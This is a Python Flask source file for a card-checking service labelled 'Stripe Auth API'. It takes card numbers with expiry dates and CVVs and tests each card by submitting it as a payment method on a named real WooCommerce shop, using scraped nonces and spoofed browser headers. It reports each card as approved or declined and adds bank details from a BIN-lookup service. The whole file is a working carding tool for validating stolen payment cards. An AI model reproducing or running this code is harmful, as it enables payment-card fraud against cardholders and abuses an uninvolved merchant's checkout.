from flask import Flask, request, jsonify
import requests
import re
import random
import string
import time
import json

app = Flask(__name__)

def full_stripe_check(cc, mm, yy, cvv):
    session = requests.Session()
    
    # Realistic browser headers
    session.headers.update({
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9',
    })

    if len(yy) == 4:
        yy = yy[-2:]

    try:
        print(f"Starting check for card: {cc[:6]}XXXXXX")
        
        # Step 1: Try to access the site directly first
        print("Step 1: Testing site accessibility...")
        base_url = 'https://shop.wiseacrebrew.com'
        test_resp = session.get(base_url)
        
        if test_resp.status_code != 200:
            return {"status": "Declined", "response": "Site is not accessible", "decline_type": "process_error"}
        
        print("Site is accessible")
        
        # Step 2: Try the direct WooCommerce add payment method approach
        print("Step 2: Trying direct payment method addition...")
        
        # First, let's try to get the necessary nonces and tokens
        account_url = 'https://shop.wiseacrebrew.com/my-account/'
        account_resp = session.get(account_url)
        
        # Look for various nonce patterns
        nonce_patterns = [
            r'name="woocommerce-add-payment-method-nonce" value="([^"]+)"',
            r'name="security" value="([^"]+)"',
            r'"_wpnonce":\s*"([^"]+)"',
            r'"nonce":"([^"]+)"',
            r'var wc_stripe_params = {[^}]*"nonce":"([^"]+)"',
        ]
        
        nonce = None
        for pattern in nonce_patterns:
            match = re.search(pattern, account_resp.text)
            if match:
                nonce = match.group(1)
                print(f"Found nonce with pattern: {nonce}")
                break
        
        if not nonce:
            # If no nonce found, try to get one from add payment method page
            payment_url = 'https://shop.wiseacrebrew.com/my-account/add-payment-method/'
            payment_resp = session.get(payment_url)
            
            for pattern in nonce_patterns:
                match = re.search(pattern, payment_resp.text)
                if match:
                    nonce = match.group(1)
                    print(f"Found nonce from payment page: {nonce}")
                    break
        
        if not nonce:
            return {"status": "Declined", "response": "Cannot find security token", "decline_type": "process_error"}
        
        # Step 3: Try direct form submission to add payment method
        print("Step 3: Submitting payment method...")
        
        # Prepare the form data
        form_data = {
            'payment_method': 'stripe',
            'wc-stripe-payment-method': 'new',  # Indicate we're adding a new card
            'stripe-card-number': cc,
            'stripe-exp-month': mm,
            'stripe-exp-year': f"20{yy}" if len(yy) == 2 else yy,
            'stripe-card-cvc': cvv,
            'stripe-name': 'Test User',
            'stripe-address-country': 'US',
            'stripe-address-zip': '10001',
            'woocommerce_add_payment_method': '1',
            '_wpnonce': nonce,
            'add-payment-method': 'Add payment method'
        }
        
        # Headers for form submission
        form_headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://shop.wiseacrebrew.com',
            'referer': 'https://shop.wiseacrebrew.com/my-account/add-payment-method/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        }
        
        add_payment_url = 'https://shop.wiseacrebrew.com/my-account/add-payment-method/'
        response = session.post(add_payment_url, data=form_data, headers=form_headers, allow_redirects=True)
        
        print(f"Form submission status: {response.status_code}")
        print(f"Response URL: {response.url}")
        
        # Check for success indicators
        success_indicators = [
            'Payment method successfully added',
            'Payment method added',
            'has been added',
            'woocommerce-message',
            'successfully',
            'payment_method_added'
        ]
        
        response_text = response.text.lower()
        
        for indicator in success_indicators:
            if indicator in response_text:
                return {"status": "Approved", "response": "Payment method added successfully", "decline_type": "none"}
        
        # Check for decline indicators
        decline_indicators = [
            'declined',
            'invalid',
            'error',
            'failed',
            'unsuccessful',
            'could not',
            'cannot'
        ]
        
        for indicator in decline_indicators:
            if indicator in response_text:
                # Try to extract the actual error message
                error_match = re.search(r'<div class="woocommerce-error">([^<]+)</div>', response.text, re.IGNORECASE)
                if error_match:
                    error_msg = error_match.group(1).strip()
                    return {"status": "Declined", "response": error_msg, "decline_type": "card_decline"}
                else:
                    return {"status": "Declined", "response": "Card was declined", "decline_type": "card_decline"}
        
        # If we can't determine the result, check response URL
        if 'add-payment-method' in response.url:
            return {"status": "Declined", "response": "Payment method could not be added", "decline_type": "process_error"}
        else:
            return {"status": "Approved", "response": "Payment method likely added successfully", "decline_type": "none"}
            
    except requests.exceptions.RequestException as e:
        return {"status": "Declined", "response": f"Network error: {str(e)}", "decline_type": "process_error"}
    except Exception as e:
        return {"status": "Declined", "response": f"Unexpected error: {str(e)}", "decline_type": "process_error"}

def get_bin_info(bin_number):
    try:
        response = requests.get(f'https://bins.antipublic.cc/bins/{bin_number}', timeout=10)
        if response.status_code == 200:
            return response.json()
        else:
            return {}
    except Exception as e:
        print(f"BIN lookup error: {e}")
        return {}

@app.route('/check', methods=['GET'])
def check_card_endpoint():
    try:
        card_str = request.args.get('card')
        
        if not card_str:
            return jsonify({"error": "Please provide card details using the 'card' parameter in the URL."}), 400

        match = re.match(r'(\d{16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})', card_str)
        if not match:
            return jsonify({"error": "Invalid card format. Use CC|MM|YY|CVV."}), 400

        cc, mm, yy, cvv = match.groups()
        
        # Validate card number
        if len(cc) != 16 or not cc.isdigit():
            return jsonify({"error": "Invalid card number"}), 400
        
        # Get BIN info first
        bin_info = get_bin_info(cc[:6])
        
        # Process the card check
        check_result = full_stripe_check(cc, mm, yy, cvv)

        final_result = {
            "status": check_result["status"],
            "response": check_result["response"],
            "decline_type": check_result["decline_type"],
            "bin_info": {
                "brand": bin_info.get('brand', 'Unknown'),
                "type": bin_info.get('type', 'Unknown'),
                "country": bin_info.get('country_name', 'Unknown'),
                "country_flag": bin_info.get('country_flag', ''),
                "bank": bin_info.get('bank', 'Unknown'),
            }
        }
        return jsonify(final_result)
    
    except Exception as e:
        return jsonify({
            "status": "Declined", 
            "response": f"API error: {str(e)}", 
            "decline_type": "process_error",
            "bin_info": {}
        })

@app.route('/')
def home():
    return jsonify({"message": "Stripe Auth API is running!", "status": "active"})

@app.route('/test')
def test():
    return jsonify({"message": "Test endpoint working!"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
